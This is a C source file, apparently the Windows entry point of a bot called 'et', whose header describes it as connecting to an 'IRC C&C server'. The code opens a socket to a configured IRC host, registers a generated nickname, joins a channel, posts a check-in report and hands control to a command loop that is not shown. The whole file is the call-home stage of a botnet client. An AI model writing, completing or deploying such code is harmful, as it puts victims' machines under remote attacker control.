/*	et_win.c
	Author: William Woodruff
	------------------------
	The starting point for et on Windows systems.
	Connects to the IRC C&C server, checks in, and calls et_main_loop_win.
*/

#define WIN32_LEAN_AND_MEAN

#include "../cnc_info.h"
#include "../gen_nick.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
	const char *quit = "QUIT";
	char nick[10];
	char message[IRC_MSGLEN];

	WSADATA wsa_data;
	SOCKET sock;
	struct sockaddr_in server;
	struct hostent *host;

	WSAStartup(MAKEWORD(2, 2), &wsa_data);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	host = gethostbyname(IRC_SERVER);

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = *((unsigned long *) host->h_addr);
	server.sin_port = htons(IRC_PORT);

	connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in));

	gen_nick(nick);
	_snprintf(message, IRC_MSGLEN, "NICK %s\r\n", nick);
	send(sock, message, strlen(message), 0);
	ZeroMemory(message, IRC_MSGLEN);
	_snprintf(message, IRC_MSGLEN, "USER %s 0 * :et phone home\r\n", nick);
	send(sock, message, strlen(message), 0);
	ZeroMemory(message, IRC_MSGLEN);
	_snprintf(message, IRC_MSGLEN, "JOIN :%s\r\n", IRC_CHANNEL);
	send(sock, message, strlen(message), 0);
	ZeroMemory(message, IRC_MSGLEN);
	_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :%s %s\r\n", IRC_CHANNEL, nick, IRC_REPORT);
	send(sock, message, strlen(message), 0);
	ZeroMemory(message, IRC_MSGLEN);

	et_main_loop_win(sock, nick);

	send(sock, quit, strlen(quit), 0);
	closesocket(sock);
	WSACleanup();

	return 0;
}
